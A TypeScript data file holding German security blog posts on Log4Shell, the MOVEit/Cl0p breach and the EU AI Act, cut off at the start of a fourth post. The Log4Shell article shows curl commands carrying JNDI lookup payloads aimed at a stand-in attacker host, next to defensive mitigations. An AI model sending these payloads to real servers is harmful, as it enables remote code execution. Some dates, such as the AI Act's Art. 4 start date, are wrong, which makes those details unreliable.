
export interface Post {
  id: string;
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  category: string;
  categoryColor: string;
  categoryBg: string;
  author: string;
  authorRole: string;
  publishedAt: string;
  readTime: number;
  imageGradient: string;
  imageSrc?: string;
  imageAlt?: string;
  badge?: string;
  badgeColor?: string;
  tags: string[];
  faqs?: { q: string; a: string }[];
  sources?: { title: string; url: string }[];
}

// ─── Static fallback data — NUR echte, dokumentierte Ereignisse ─────────────
// Quellen: BSI, NIST NVD, CISA, Emsisoft, Sophos, IBM, offizielle Hersteller-Advisories
export const STATIC_POSTS: Post[] = [
  // ── 1. Log4Shell ────────────────────────────────────────────────────────────
  {
    id: '1',
    slug: 'log4shell-cve-2021-44228',
    title: 'Log4Shell (CVE-2021-44228): Analyse der kritischsten Java-Schwachstelle',
    excerpt: 'CVSS 10.0 — Log4Shell ermöglichte Remote Code Execution auf Millionen von Servern weltweit. Eine technische Analyse des Angriffsvektors, der Patch-Geschichte und der Lektionen für Unternehmen.',
    category: 'Schwachstelle',
    categoryColor: '#FF9632',
    categoryBg: 'rgba(255,150,50,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: BSI, NIST NVD, CISA Advisory AA21-356A',
    publishedAt: '2024-12-09',
    readTime: 14,
    imageGradient: 'linear-gradient(135deg, #1A0800 0%, #2A1000 40%, #1A0800 100%)',
    badge: 'CVSS 10.0',
    badgeColor: '#FF2D6F',
    tags: ['Log4Shell', 'CVE-2021-44228', 'Java', 'RCE', 'Apache', 'JNDI', 'Schwachstelle'],
    sources: [
      { title: 'BSI Warnung: Log4j-Schwachstelle', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Cyber-Sicherheitslage/Analysen-und-Prognosen/Threat-Intelligence/Log4j/log4j_node.html' },
      { title: 'NIST NVD: CVE-2021-44228', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
      { title: 'CISA Advisory AA21-356A', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a' },
      { title: 'Apache Log4j Security Advisories', url: 'https://logging.apache.org/log4j/2.x/security.html' },
    ],
    faqs: [
      { q: 'Was macht Log4Shell so gefährlich?', a: 'Log4Shell ist in der gesamten Software-Lieferkette verankert. Weil Log4j 2 eine der meistgenutzten Java-Logging-Bibliotheken weltweit ist, war nahezu jede Java-Anwendung potenziell betroffen — von Cloud-Infrastruktur über Enterprise-Software bis hin zu Minecraft-Servern. Der Angriff ist trivial einfach auszuführen: Eine einzelne präparierte Zeichenkette in einem Log-Eintrag reicht aus.' },
      { q: 'Bin ich noch gefährdet, wenn ich Log4j nicht direkt einsetze?', a: 'Ja, möglicherweise. Log4j ist in zahlreichen Drittanbieter-Komponenten, Frameworks und Tools eingebettet. Auch wenn Sie Log4j nicht direkt als Abhängigkeit führen, können verwendete Bibliotheken oder kommerzielle Software (z.B. VMware, Cisco, IBM-Produkte) die verwundbare Version enthalten.' },
      { q: 'Welche Log4j-Version ist sicher?', a: 'Sicher ist Apache Log4j 2.17.1 (Java 8) oder höher. Version 2.15.0 und 2.16.0 enthielten noch weitere Schwachstellen (CVE-2021-45046, CVE-2021-45105). Für Java 7 ist 2.12.4, für Java 6 ist 2.3.2 die letzte sichere Version.' },
      { q: 'Was ist mit Log4j 1.x?', a: 'Log4j 1.x ist seit 2015 End-of-Life und von CVE-2021-44228 nicht direkt betroffen — enthält aber andere kritische Schwachstellen (z.B. CVE-2022-23302, CVE-2022-23305). Migration auf Log4j 2.17.1+ oder alternative Logging-Frameworks wird dringend empfohlen.' },
    ],
    content: `<h2 id="ueberblick">Was ist Log4Shell?</h2>
<p>Log4Shell ist der Name für die Schwachstelle <strong>CVE-2021-44228</strong> in Apache Log4j 2, einer der am weitesten verbreiteten Logging-Bibliotheken im Java-Ökosystem. Die Schwachstelle ermöglicht es einem Angreifer, über eine manipulierte Zeichenkette in einer Log-Nachricht beliebigen Code auf einem betroffenen Server auszuführen — ohne Authentifizierung, ohne Benutzerinteraktion.</p>
<p>Der CVSS-Score (Common Vulnerability Scoring System) beträgt <strong>10.0 — der maximal mögliche Wert</strong>. Das Bundesamt für Sicherheit in der Informationstechnik (BSI) stufte die Lage am 11. Dezember 2021 als <strong>IT-Bedrohungslage 4 — Extrem kritisch</strong> ein, die höchste Warnstufe des BSI.</p>

<h2 id="zeitlinie">Zeitlinie: Von der Entdeckung zur Eskalation</h2>
<ul>
<li><strong>24. November 2021:</strong> Chen Zhaojun vom Alibaba Cloud Security Team meldet die Schwachstelle an das Apache Security Team</li>
<li><strong>9. Dezember 2021:</strong> Öffentliche Bekanntmachung — ein Tweet löst sofortige globale Ausnutzung aus</li>
<li><strong>9. Dezember 2021:</strong> Apache veröffentlicht Log4j 2.15.0 (erste, unvollständige Korrektur)</li>
<li><strong>11. Dezember 2021:</strong> BSI erklärt Warnstufe 4 (Extrem kritisch)</li>
<li><strong>13. Dezember 2021:</strong> Apache veröffentlicht 2.16.0 (behebt CVE-2021-45046)</li>
<li><strong>18. Dezember 2021:</strong> Apache veröffentlicht 2.17.0 (behebt CVE-2021-45105, DoS)</li>
<li><strong>28. Dezember 2021:</strong> Apache veröffentlicht 2.17.1 (behebt CVE-2021-44832)</li>
</ul>
<blockquote><p>„Die Schwachstelle ist extrem kritisch, da sie eine Ausführung von Schadcode durch Angreifer auf betroffenen Systemen erlaubt. Angriffe sind bereits aktiv zu beobachten."</p><cite>— BSI Lageeinschätzung, 11. Dezember 2021</cite></blockquote>

<h2 id="technik">Technische Analyse: Wie Log4Shell funktioniert</h2>
<p>Log4j 2 unterstützt sogenannte <strong>Lookup-Mechanismen</strong>, die in Log-Nachrichten Variablen auswerten. Der anfällige Mechanismus ist JNDI (Java Naming and Directory Interface), der ursprünglich für legitime Datenbankverbindungen entwickelt wurde.</p>
<p>Ein Angreifer sendet eine Zeichenkette wie <code>\${jndi:ldap://angreifer.de/exploit}</code> an eine Anwendung, die diese Eingabe loggt. Log4j wertet die Lookup-Syntax aus, verbindet sich mit dem angreifer-kontrollierten LDAP-Server und lädt von dort beliebigen Java-Code herunter und führt ihn aus.</p>
<pre><code class="language-bash"># Beispiel: Angreifer sendet präparierte HTTP-Header
curl -H 'X-Api-Version: \${jndi:ldap://angreifer.de/a}' https://ziel.de/api

# Oder direkt im URL-Parameter
curl 'https://ziel.de/search?q=\${jndi:ldap://angreifer.de/a}'

# Oder in User-Agent, Username, E-Mail-Feldern — überall wo die App loggt</code></pre>
<p>Der Angriff ist deshalb so schwer zu verteidigen, weil praktisch jede Eingabe eines Nutzers — HTTP-Header, Formulareingaben, Suchwörter, Benutzernamen — in Log-Nachrichten landen kann.</p>

<h2 id="betroffene-produkte">Betroffene Produkte (Auswahl)</h2>
<p>Das Ausmaß der Betroffenheit war beispiellos. Folgende bekannte Systeme waren unter anderem verwundbar (nach Herstellerbestätigungen):</p>
<ul>
<li><strong>Cloud-Dienste:</strong> Amazon AWS, Apple iCloud, Cloudflare, Twitter</li>
<li><strong>Enterprise-Software:</strong> VMware vCenter, Cisco-Produkte, IBM WebSphere, Oracle-Produkte</li>
<li><strong>Sicherheitsprodukte:</strong> Mehrere SIEM- und EDR-Lösungen (Hersteller wurden Betroffene)</li>
<li><strong>Entwicklertools:</strong> JetBrains, Apache Solr, Apache Druid, Apache Kafka</li>
<li><strong>Gaming:</strong> Minecraft Java Edition (einer der ersten öffentlich bekannten Angriffsvektoren)</li>
</ul>

<h2 id="ausnutzung">Aktive Ausnutzung durch staatliche Akteure</h2>
<p>Laut dem gemeinsamen Advisory <strong>AA21-356A der US-Behörden CISA, FBI, NSA</strong> (veröffentlicht 17. Dezember 2021) wurde Log4Shell aktiv von APT-Gruppen aus China, Iran, Nordkorea und Russland ausgenutzt:</p>
<ul>
<li><strong>China (APT-Gruppen):</strong> Spionage gegen Regierung, Verteidigung, Energie</li>
<li><strong>Iran:</strong> APT35 (Charming Kitten) setzte Log4Shell für Ransomware und Spionage ein</li>
<li><strong>Nordkorea:</strong> Lazarus Group nutzte die Schwachstelle für Kryptowährungs-Diebstahl</li>
<li><strong>Russland:</strong> Sandworm und APT28 wurden mit Log4Shell-Angriffen in Verbindung gebracht</li>
</ul>
<p>Darüber hinaus nutzten kriminelle Gruppen Log4Shell massenhaft zur Installation von Cryptominern, Botnets (z.B. Mirai-Varianten) und Ransomware (z.B. Conti, Khonsari).</p>

<h2 id="sofortmassnahmen">Sofortmaßnahmen und Schutz</h2>
<pre><code class="language-bash"># 1. Sofort: Log4j-Version prüfen
find / -name "log4j*.jar" 2>/dev/null
mvn dependency:tree | grep log4j

# 2. Workaround (bis Patch ausgerollt): JNDI deaktivieren
# Für Log4j 2.10.0 bis 2.14.1:
java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
# ODER: Umgebungsvariable setzen
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 3. Update auf sichere Version
# Maven:
# log4j-core: 2.17.1 (Java 8+), 2.12.4 (Java 7), 2.3.2 (Java 6)

# 4. Netzwerk: Ausgehende LDAP/RMI-Verbindungen blockieren
# (verhindert Exploit-Nachladen auch wenn Lookup ausgeführt wird)
iptables -A OUTPUT -p tcp --dport 389 -j DROP  # LDAP
iptables -A OUTPUT -p tcp --dport 1099 -j DROP # RMI</code></pre>

<h2 id="lektionen">Was Unternehmen aus Log4Shell lernen müssen</h2>
<p>Log4Shell hat vier strukturelle Schwachstellen in der Softwareentwicklung aufgedeckt:</p>
<ol>
<li><strong>Software Bill of Materials (SBOM) fehlt:</strong> Viele Unternehmen wussten nicht, welche Versionen von Log4j in welchen Systemen enthalten sind. Eine SBOM — ein vollständiges Inventar aller Software-Komponenten — ist heute Best Practice.</li>
<li><strong>Transitive Abhängigkeiten sind unsichtbar:</strong> Log4j wurde häufig nicht direkt, sondern als Abhängigkeit von Abhängigkeiten eingebunden. Software Composition Analysis (SCA) Tools sind zwingend notwendig.</li>
<li><strong>Patch-Zyklen sind zu langsam:</strong> Viele Systeme waren Wochen nach Veröffentlichung des Patches noch verwundbar. Kritische CVEs erfordern Patch-Zeitfenster unter 24 Stunden.</li>
<li><strong>Defense in Depth:</strong> Systeme ohne ausgehende Netzwerkverbindungen waren gegen Log4Shell deutlich resistenter. Zero-Trust-Netzwerkarchitekturen hätten den Schaden begrenzt.</li>
</ol>

<h2 id="fazit">Fazit: Log4Shell als Wendepunkt</h2>
<p>Log4Shell hat die Diskussion um Software Supply Chain Security grundlegend verändert. Die US-Regierung reagierte mit der Executive Order 14028 (Improving the Nation's Cybersecurity), die SBOM-Pflichten für Bundesbehörden einführt. Die EU hat das Thema im <strong>Cyber Resilience Act</strong> aufgenommen, der SBOM-Anforderungen für in der EU vertriebene Produkte einführt.</p>
<p>Für IT-Teams bedeutet Log4Shell: <strong>Kenntnis der eigenen Software-Lieferkette ist keine Option, sondern Grundvoraussetzung für Sicherheit.</strong></p>`,
  },

  // ── 2. MOVEit Transfer ──────────────────────────────────────────────────────
  {
    id: '2',
    slug: 'moveit-hack-cl0p-2023',
    title: 'MOVEit-Hack 2023: Wie Cl0p 2.600 Organisationen mit einer SQL-Injection kompromittierte',
    excerpt: 'CVE-2023-34362, CVSS 9.8 — Die Cl0p-Ransomware-Gruppe nutzte eine Zero-Day-Schwachstelle in MOVEit Transfer aus und kompromittierte über 2.600 Organisationen weltweit, darunter BBC, British Airways und Bundesbehörden.',
    category: 'Incident',
    categoryColor: '#FF2D6F',
    categoryBg: 'rgba(255,45,111,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Mandiant, Emsisoft, Progress Software, BSI',
    publishedAt: '2024-11-15',
    readTime: 11,
    imageGradient: 'linear-gradient(135deg, #1A0610 0%, #240A18 50%, #1A0610 100%)',
    badge: 'KRITISCH',
    badgeColor: '#FF2D6F',
    tags: ['MOVEit', 'CVE-2023-34362', 'Cl0p', 'SQL-Injection', 'Supply-Chain', 'Datenpanne'],
    sources: [
      { title: 'Progress Software Security Advisory', url: 'https://www.progress.com/security/moveit-transfer-and-moveit-cloud-vulnerability' },
      { title: 'Mandiant: MOVEit Transfer Zero-Day', url: 'https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft' },
      { title: 'Emsisoft MOVEit Attack Impact', url: 'https://www.emsisoft.com/en/blog/44123/the-impact-of-the-moveit-breach/' },
      { title: 'NIST NVD: CVE-2023-34362', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-34362' },
    ],
    faqs: [
      { q: 'War MOVEit ein Ransomware-Angriff?', a: 'Nein — trotz der Zuschreibung an die Cl0p-Ransomware-Gruppe wurde beim MOVEit-Angriff keine Verschlüsselung eingesetzt. Cl0p beschränkte sich auf Datendiebstahl und Erpressung (sog. Data Extortion / Double Extortion ohne Encryption). Dies macht den Vorfall zu einem reinen Datenpanne-Szenario.' },
      { q: 'Welche deutschen Organisationen waren betroffen?', a: 'Direkt bestätigt wurde Aon Deutschland. Weitere deutsche Unternehmen nutzten MOVEit Transfer oder waren indirekt über Dienstleister (z.B. Zellis Payroll) betroffen. Das BSI hat eine Warnung herausgegeben und zur Überprüfung aufgerufen. Aufgrund von Meldeschwellen wurden nicht alle deutschen Betroffenen öffentlich bekannt.' },
      { q: 'Wie erkenne ich ob meine Daten betroffen waren?', a: 'Cl0p veröffentlichte Listen der Opferorganisationen auf seiner Leak-Seite im Darknet. Überprüfen Sie ob Ihre Organisation oder ein genutzter Dienstleister MOVEit Transfer eingesetzt hat. Nutzen Sie Have I Been Pwned (haveibeenpwned.com) für eine Prüfung Ihrer E-Mail-Adresse.' },
      { q: 'Was ist der aktuelle Stand?', a: 'US-Behörden (State Department Rewards for Justice) boten 10 Millionen USD Belohnung für Hinweise auf die Cl0p-Führung. Stand 2024 wurden mehrere mutmaßliche Cl0p-Mitglieder in Ukraine und Deutschland verhaftet. Der Fall wird weiterhin international verfolgt.' },
    ],
    content: `<h2 id="ueberblick">Was ist MOVEit Transfer?</h2>
<p>MOVEit Transfer ist eine Enterprise-Software des US-Herstellers Progress Software (früher Ipswitch) für den sicheren, nachverfolgbaren Dateitransfer. Die Software wird von tausenden Unternehmen, Behörden und Gesundheitseinrichtungen weltweit eingesetzt — vor allem dort, wo regulatorische Anforderungen (DSGVO, HIPAA, SOX) den sicheren Transfer sensibler Daten vorschreiben.</p>
<p>Genau diese Vertrauensstellung machte MOVEit Transfer zum idealen Angriffsziel.</p>

<h2 id="schwachstelle">Die Schwachstelle: CVE-2023-34362</h2>
<p><strong>CVE-2023-34362</strong> ist eine <strong>SQL-Injection-Schwachstelle</strong> in der Webanwendung von MOVEit Transfer. CVSS-Score: <strong>9.8 (kritisch)</strong>. Über eine nicht sanitisierte Datenbankabfrage konnten Angreifer ohne Authentifizierung auf die Datenbank zugreifen und anschließend beliebige Dateien aus dem System herunterladen.</p>
<p>Technisch ermöglichte die Schwachstelle zwei Schritte:</p>
<ol>
<li><strong>Authentication Bypass:</strong> Durch manipulierte SQL-Abfragen umging Cl0p das Login-System und erstellte sich Administrator-Sessions</li>
<li><strong>Dateiexfiltration:</strong> Mit Administrator-Rechten wurden alle gespeicherten Dateien systematisch heruntergeladen, bevor der Angriff erkannt wurde</li>
</ol>
<pre><code class="language-bash"># Vereinfachte Darstellung des SQL-Injection-Vektors (zur Aufklärung)
# Angreifer manipuliert den Session-Token-Parameter:
POST /guestaccess.aspx HTTP/1.1
# Präparierter Parameter ermöglicht SQL-Execution ohne Login</code></pre>
<p>Progress Software veröffentlichte am <strong>31. Mai 2023</strong> eine Security Advisory und Patches. Laut Analyse von <strong>Mandiant</strong> hatte Cl0p die Schwachstelle jedoch bereits ab dem <strong>27. Mai 2023</strong> aktiv ausgenutzt — als Zero-Day, also bevor Progress überhaupt von der Lücke wusste.</p>
<blockquote><p>„Cl0p hat die Lücke als Zero-Day ausgenutzt. Die Gruppe hat in wenigen Stunden automatisiert tausende MOVEit-Instanzen gescannt und kompromittiert."</p><cite>— Mandiant Threat Intelligence, Juni 2023</cite></blockquote>

<h2 id="cl0p">Wer ist Cl0p?</h2>
<p>Cl0p (auch: CL0P, TA505, FIN11) ist eine russischsprachige Cyberkriminellen-Gruppe, die seit 2019 aktiv ist. Die Gruppe ist bekannt für:</p>
<ul>
<li><strong>Massive Supply-Chain-Angriffe:</strong> Cl0p zielt gezielt auf Infrastruktur-Software ab, die von vielen Unternehmen gleichzeitig genutzt wird (Accellion FTA 2021, GoAnywhere MFT 2023, MOVEit 2023)</li>
<li><strong>Data Extortion statt Verschlüsselung:</strong> Seit 2021 bevorzugt Cl0p reinen Datendiebstahl ohne Ransomware-Einsatz — dies vermeidet Betriebsunterbrechungen und damit sofortige Entdeckung</li>
<li><strong>Öffentliche Erpressung:</strong> Opfer werden auf einer Darknet-Leak-Seite veröffentlicht, wenn sie nicht zahlen</li>
</ul>

<h2 id="ausmass">Ausmaß: 2.600+ Organisationen, 77+ Millionen Menschen</h2>
<p>Laut einer Analyse von <strong>Emsisoft</strong> (Stand Dezember 2023) wurden durch den MOVEit-Angriff:</p>
<ul>
<li><strong>2.620+ Organisationen</strong> direkt oder indirekt kompromittiert</li>
<li><strong>77+ Millionen Personen</strong> durch gestohlene Daten betroffen</li>
</ul>
<p>Zu den bestätigten Opfern gehören (Auswahl):</p>
<ul>
<li><strong>Medien &amp; Transport:</strong> BBC, British Airways</li>
<li><strong>Gesundheit:</strong> Mehrere US-amerikanische Krankenkassen und Krankenhäuser</li>
<li><strong>Dienstleister:</strong> Zellis (Gehaltsabrechnungsanbieter für u.a. British Airways, BBC, Boots), Aon, PwC, EY</li>
<li><strong>US-Behörden:</strong> US-Energieministerium (DOE), Department of Health and Human Services</li>
<li><strong>Universität:</strong> Johns Hopkins University, Louisiana State University</li>
</ul>

<h2 id="reaktion">Reaktion: Patches und Folgeangriffe</h2>
<p>Progress Software veröffentlichte nach dem initialen Patch weitere Sicherheitsupdates für nachgelagerte Schwachstellen:</p>
<ul>
<li><strong>CVE-2023-34362</strong> (31. Mai 2023): Initialer Zero-Day — Patch in Version 2023.0.4</li>
<li><strong>CVE-2023-35036</strong> (9. Juni 2023): Weitere SQL-Injection — Patch umgehend notwendig</li>
<li><strong>CVE-2023-35708</strong> (15. Juni 2023): Dritte Schwachstelle innerhalb von zwei Wochen</li>
</ul>
<p>Die US-Regierung stufte MOVEit-Angriffe als Bedrohung nationaler Infrastruktur ein. Das State Department bot über das Rewards for Justice Programm <strong>10 Millionen USD</strong> für Hinweise auf die Cl0p-Führung.</p>

<h2 id="lektionen">Was IT-Teams daraus lernen müssen</h2>
<ol>
<li><strong>File-Transfer-Systeme sind hochpriorisierte Angriffsziele:</strong> Dienste, die für den Transfer sensibler Daten genutzt werden, sind exponiert und werden gezielt angegriffen. Regelmäßige Penetrationstests und schnelle Patch-Reaktion sind Pflicht.</li>
<li><strong>Zero-Day-Schutz durch Defense in Depth:</strong> Wenn ein Zero-Day ausgenutzt wird, sind Netzwerksegmentierung, ausgehendes Traffic Monitoring und Data Loss Prevention (DLP) die einzigen wirksamen Gegenmaßnahmen.</li>
<li><strong>Drittanbieter-Risiken systematisch managen:</strong> Viele Betroffene waren nicht direkte MOVEit-Nutzer, sondern Kunden von Dienstleistern wie Zellis. Third-Party Risk Management (TPRM) muss alle genutzten SaaS- und Software-Lieferanten umfassen.</li>
<li><strong>Incident Response Playbook für Datenexfiltration:</strong> Die sofortige Identifikation welche Daten betroffen waren, ist entscheidend für DSGVO-Meldepflichten (72-Stunden-Frist an Aufsichtsbehörde).</li>
</ol>`,
  },

  // ── 3. EU AI Act ────────────────────────────────────────────────────────────
  {
    id: '3',
    slug: 'eu-ai-act-2024-compliance',
    title: 'EU AI Act: Vollständiger Überblick — Fristen, Pflichten und Strafen (Stand 2024)',
    excerpt: 'Die Verordnung (EU) 2024/1689 trat am 1. August 2024 in Kraft. Ab Februar 2025 gelten die ersten Verbote. Welche KI-Systeme betroffen sind, welche Pflichten entstehen und was bei Verstößen droht.',
    category: 'Regulierung',
    categoryColor: '#7890FF',
    categoryBg: 'rgba(120,144,255,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Amtsblatt der EU, Verordnung (EU) 2024/1689',
    publishedAt: '2024-10-01',
    readTime: 12,
    imageGradient: 'linear-gradient(135deg, #060B24 0%, #0A0F38 50%, #060B24 100%)',
    badge: 'PFLICHT',
    badgeColor: '#7890FF',
    tags: ['EU AI Act', 'KI-Regulierung', 'Compliance', 'DSGVO', 'Hochrisiko-KI', 'GPAI'],
    sources: [
      { title: 'EU AI Act — Amtsblatt der EU (12. Juli 2024)', url: 'https://eur-lex.europa.eu/legal-content/DE/TXT/?uri=CELEX:32024R1689' },
      { title: 'EU KI-Büro (AI Office)', url: 'https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence' },
      { title: 'BSI: KI-Sicherheit und EU AI Act', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Informationen-und-Empfehlungen/Kuenstliche-Intelligenz/kuenstliche-intelligenz_node.html' },
    ],
    faqs: [
      { q: 'Gilt der EU AI Act auch für US-Unternehmen?', a: 'Ja. Der EU AI Act gilt für alle Anbieter, die KI-Systeme in der EU auf den Markt bringen oder in Betrieb nehmen — unabhängig vom Unternehmenssitz. Das Prinzip ist analog zur DSGVO: Maßgeblich ist der Markt, nicht der Firmensitz. US-Unternehmen wie OpenAI, Google oder Microsoft müssen compliant sein, wenn sie Dienste in der EU anbieten.' },
      { q: 'Was passiert mit bestehenden KI-Systemen?', a: 'Für KI-Systeme die vor dem 2. August 2026 bereits in Verkehr gebracht wurden, gilt eine Übergangsfrist bis zum 2. August 2027 (Hochrisiko-Systeme Anhang III) bzw. 2. August 2030 (Hochrisiko-Systeme Anhang I für regulierte Produkte). Diese Übergangsfristen gelten nur, wenn die Systeme nach dem Inverkehrbringen keine wesentlichen Änderungen erfahren.' },
      { q: 'Was sind die höchsten Strafen?', a: 'Für Verstöße gegen Art. 5 (verbotene KI-Praktiken) drohen Bußgelder von bis zu 35 Millionen EUR oder 7% des weltweiten Jahresumsatzes (der höhere Wert gilt). Für andere Verstöße: bis zu 15 Millionen EUR oder 3%. Für falsche Angaben gegenüber Behörden: bis zu 7,5 Millionen EUR oder 1,5%. Für KMU und Startups können niedrigere Obergrenzen gelten.' },
      { q: 'Welche KI-Systeme sind komplett verboten?', a: 'Ab 2. Februar 2025 verboten: Soziale Bewertungssysteme (Social Scoring), unterschwellige Manipulation (Subliminal Techniques), Ausnutzung von Schwächen vulnerabler Gruppen, Echtzeit-Gesichtserkennung im öffentlichen Raum (mit engen Ausnahmen für Strafverfolgung), biometrische Kategorisierung nach politischen Überzeugungen, KI-gestützte Emotionserkennung am Arbeitsplatz/in Bildungseinrichtungen.' },
    ],
    content: `<h2 id="was-ist-der-eu-ai-act">Was ist der EU AI Act?</h2>
<p>Der <strong>Artificial Intelligence Act</strong> (Verordnung (EU) 2024/1689) ist die weltweit erste umfassende KI-Regulierung. Er wurde vom Europäischen Parlament am 13. März 2024 verabschiedet, vom Rat der EU am 21. Mai 2024 angenommen, am <strong>12. Juli 2024 im Amtsblatt der EU veröffentlicht</strong> und trat am <strong>1. August 2024 in Kraft</strong>.</p>
<p>Der EU AI Act verfolgt einen risikobasierten Ansatz: Je höher das Risiko eines KI-Systems für Grundrechte und Sicherheit, desto strenger die Anforderungen. Systeme mit minimalem Risiko sind praktisch unreguliert; verbotene Systeme dürfen gar nicht betrieben werden.</p>

<h2 id="geltungsbereich">Geltungsbereich: Wen betrifft das Gesetz?</h2>
<p>Der EU AI Act gilt für:</p>
<ul>
<li><strong>Anbieter</strong> (Provider): Entwickler und Unternehmen, die KI-Systeme in der EU in Verkehr bringen</li>
<li><strong>Betreiber</strong> (Deployer): Unternehmen, die KI-Systeme im beruflichen Kontext einsetzen</li>
<li><strong>Importeure und Händler</strong> von KI-Systemen</li>
<li><strong>Drittlandsanbieter</strong> (z.B. US-Unternehmen), wenn die Ausgaben des KI-Systems in der EU verwendet werden</li>
</ul>
<p>Ausgenommen sind: Militärische Anwendungen, Forschung und Entwicklung (mit Einschränkungen), private nicht-professionelle Nutzung.</p>

<h2 id="risikoklassen">Die vier Risikoklassen</h2>
<h3 id="verboten">1. Unannehmbares Risiko — Verboten (Art. 5)</h3>
<p>Ab <strong>2. Februar 2025</strong> verboten sind unter anderem:</p>
<ul>
<li>KI-Systeme zur unterschwelligen Beeinflussung (Subliminal Techniques) die Entscheidungen schaden</li>
<li>Ausnutzung von Schwächen spezifischer Gruppen (Kinder, ältere Menschen, Behinderungen)</li>
<li>Soziale Bewertungssysteme (Social Credit Scoring) durch öffentliche Stellen</li>
<li>Biometrische Echtzeit-Fernidentifizierung in öffentlichen Räumen durch Strafverfolgungsbehörden (außer enge Ausnahmen)</li>
<li>Biometrische Kategorisierung nach Rasse, politischer Meinung, Religion, Gewerkschaftszugehörigkeit</li>
<li>Emotionserkennung am Arbeitsplatz und in Bildungseinrichtungen</li>
<li>Vorhersage von Straftaten basierend auf Profiling</li>
</ul>

<h3 id="hochrisiko">2. Hochrisiko-KI (Art. 6 und Anhang III)</h3>
<p>Hochrisiko-KI-Systeme unterliegen strengen Anforderungen und müssen vor dem Marktzugang eine Konformitätsbewertung durchlaufen. Darunter fallen:</p>
<ul>
<li>KI in kritischer Infrastruktur (Energie, Wasser, Verkehr)</li>
<li>KI in Bildung (z.B. automatische Bewertung von Prüfungsleistungen)</li>
<li>KI im Personalwesen (Rekrutierung, Leistungsbewertung)</li>
<li>KI für Kredit- und Versicherungsbewertungen</li>
<li>KI in der Strafverfolgung</li>
<li>KI für Asyl-, Visa- und Grenzentscheidungen</li>
<li>KI in Justiz und demokratischen Prozessen</li>
</ul>
<p><strong>Anforderungen für Hochrisiko-KI:</strong> Risikomanagementsystem, Daten-Governance, technische Dokumentation, Transparenzpflichten, menschliche Aufsicht, Genauigkeit und Robustheit, Registrierung in EU-Datenbank, Konformitätserklärung, CE-Kennzeichnung.</p>

<h3 id="begrenztes-risiko">3. Begrenztes Risiko (Art. 50)</h3>
<p>Hauptsächlich Transparenzpflichten:</p>
<ul>
<li><strong>Chatbots</strong> müssen sich als KI zu erkennen geben</li>
<li><strong>Deepfake-Inhalte</strong> müssen als KI-generiert gekennzeichnet sein</li>
<li><strong>Emotionserkennungs-KI</strong> muss auf ihre Funktion hinweisen</li>
</ul>

<h3 id="minimales-risiko">4. Minimales Risiko</h3>
<p>KI-Spam-Filter, KI-gestützte Suche, Empfehlungsalgorithmen und ähnliche Anwendungen unterliegen keinen spezifischen Pflichten des EU AI Act — allerdings können andere Rechtsbereiche (DSGVO, DSA) gelten.</p>

<h2 id="gpai">Allzweck-KI-Modelle (GPAI — Art. 51-56)</h2>
<p>Der EU AI Act enthält erstmals Regeln für <strong>General Purpose AI Models (GPAI)</strong> wie GPT-4, Gemini, Claude oder Llama. Diese gelten ab <strong>2. August 2025</strong>.</p>
<ul>
<li>Alle GPAI-Anbieter: Technische Dokumentation, Zusammenfassung der Trainingsdaten, Urheberrechts-Compliance</li>
<li>GPAI mit systemischen Risiken (Training-Rechenleistung über 10^25 FLOPs): Erweiterte Modell-Evaluation, Adversarial Testing, Meldung schwerwiegender Vorfälle, Cybersicherheits-Maßnahmen</li>
</ul>

<h2 id="fristen">Fristen im Überblick</h2>
<pre><code class="language-bash"># EU AI Act — Zeitplan
01.08.2024  → In Kraft getreten (Verordnung (EU) 2024/1689)
02.02.2025  → Art. 5: Verbotene KI-Praktiken gelten
02.05.2025  → Art. 4: KI-Kompetenz-Pflichten für Personal
02.08.2025  → GPAI-Regeln (Art. 51-56) gelten
02.08.2026  → Hochrisiko-KI Anhang III (z.B. HR, Kredit, Bildung)
02.08.2027  → Hochrisiko-KI Anhang I (regulierte Produkte, z.B. Medizinprodukte)
02.08.2030  → Übergangsfrist für bereits im Einsatz befindliche KI endet</code></pre>

<h2 id="strafen">Strafen bei Verstößen</h2>
<ul>
<li><strong>Verbotene KI (Art. 5):</strong> Bis zu 35 Millionen EUR oder 7% des weltweiten Jahresumsatzes</li>
<li><strong>Andere Verstöße:</strong> Bis zu 15 Millionen EUR oder 3% des Jahresumsatzes</li>
<li><strong>Falsche Angaben:</strong> Bis zu 7,5 Millionen EUR oder 1,5% des Jahresumsatzes</li>
<li>Für KMU und Startups können niedrigere Obergrenzen gelten (Verhältnismäßigkeit)</li>
</ul>

<h2 id="compliance">Was Unternehmen jetzt tun sollten</h2>
<ol>
<li><strong>KI-Inventar erstellen:</strong> Alle eingesetzten KI-Systeme — intern entwickelte und eingekaufte — inventarisieren und klassifizieren</li>
<li><strong>Risikoklassifizierung:</strong> Jeden KI-Einsatz nach Art. 6 und Anhang III prüfen (Hochrisiko ja/nein?)</li>
<li><strong>Verbotene Praktiken sofort prüfen:</strong> Ab 2. Februar 2025 müssen alle verbotenen Systeme abgestellt sein</li>
<li><strong>AI Governance aufbauen:</strong> Zuständigkeiten, Dokumentationsprozesse und Risikoüberwachung etablieren</li>
<li><strong>Personal schulen:</strong> Ab 2. Mai 2025 gilt Pflicht zur Sicherstellung von KI-Kompetenz bei Personal (Art. 4)</li>
</ol>`,
  },

  // ── 4. BSI Lagebericht 2024 ─────────────────────────────────────────────────
  {
    id: '4',
    slug: 'bsi-lagebericht-2024',
    title: 'BSI Lagebericht 2024: IT-Sicherheit in Deutschland — angespannt bis kritisch',
    excerpt: 'Das Bundesamt für Sicherheit in der Informationstechnik (BSI) veröffentlichte im November 2024 seinen jährlichen Lagebericht. Die Bewertung: Die Lage der IT-Sicherheit in Deutschland ist weiterhin angespannt bis kritisch.',
    category: 'Lagebericht',
    categoryColor: '#00F0FF',
    categoryBg: 'rgba(0,240,255,0.1)',
